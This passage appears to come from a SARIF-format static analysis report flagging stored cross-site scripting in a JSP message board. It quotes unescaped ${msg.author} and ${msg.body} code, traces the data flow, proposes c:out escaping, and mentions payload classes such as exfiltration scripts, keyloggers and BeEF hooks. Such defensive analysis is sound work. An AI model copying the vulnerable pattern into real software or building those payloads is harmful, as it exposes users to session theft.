                    "text": "                            <h4>${msg.subject}</h4>\n                            <div class=\"media\">\n                                <div class=\"media-content\">\n                                    <div class=\"content\">\n                                        by ${msg.author} on ${msg.timestamp}\n                                    </div>\n                                </div>\n                            </div>\n                        </article>\n                        <article>\n                            <div class=\"media\">"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "2ADCF643AC69A2A1DC72A3A0454F66A6"
          },
          "properties": {
            "impact": 4.5,
            "likelihood": 4,
            "snippetStartLine": 17,
            "summary": "Stored XSS: unescaped EL expression ${msg.author} renders attacker-controlled cookie-derived author name directly into HTML",
            "remediationSummary": "Replace ${msg.author} with &lt;c:out value=\"${msg.author}\"/&gt; or ${fn:escapeXml(msg.author)} to prevent stored XSS via the author cookie value.",
            "remediation": "Replace the bare EL expression with JSTL output encoding:\n\n```jsp\nby <c:out value=\"${msg.author}\"/> on <c:out value=\"${msg.timestamp}\"/>\n```\n\nThis HTML-encodes the author name before it is written into the HTML stream. Additionally, consider validating/sanitising usernames during registration to disallow HTML-significant characters."
          }
        },
        {
          "ruleId": "cross-site-scripting/persistent",
          "level": "error",
          "message": {
            "text": "At line 32 of read.jsp, the JSP EL expression ${msg.body} is rendered inside a <div class=\"content\"> element with no HTML encoding:\n\n<div class=\"content\">\n    ${msg.body}\n</div>\n\nThe body field originates from the body HTTP request parameter (<textarea name=\"body\">) in the compose form, stored verbatim in the database by MessageDAO.post() and retrieved by MessageDAO.read(). There is no server-side sanitisation at any point in the data flow.\n\nBecause the message body is the largest free-form text area available to an attacker, this is the highest-value XSS sink in the application: an attacker can craft complex payloads, including multi-stage exfiltration scripts, keyloggers, or BeEF hook injections. JSP EL ${...} provides no automatic HTML escaping.",
            "markdown": "At line 32 of `read.jsp`, the JSP EL expression `${msg.body}` is rendered inside a `<div class=\"content\">` element with no HTML encoding:\n\n```jsp\n<div class=\"content\">\n    ${msg.body}\n</div>\n```\n\nThe `body` field originates from the `body` HTTP request parameter (`<textarea name=\"body\">`) in the compose form, stored verbatim in the database by `MessageDAO.post()` and retrieved by `MessageDAO.read()`. There is no server-side sanitisation at any point in the data flow.\n\nBecause the message body is the largest free-form text area available to an attacker, this is the highest-value XSS sink in the application: an attacker can craft complex payloads, including multi-stage exfiltration scripts, keyloggers, or BeEF hook injections. JSP EL `${...}` provides no automatic HTML escaping."
          },
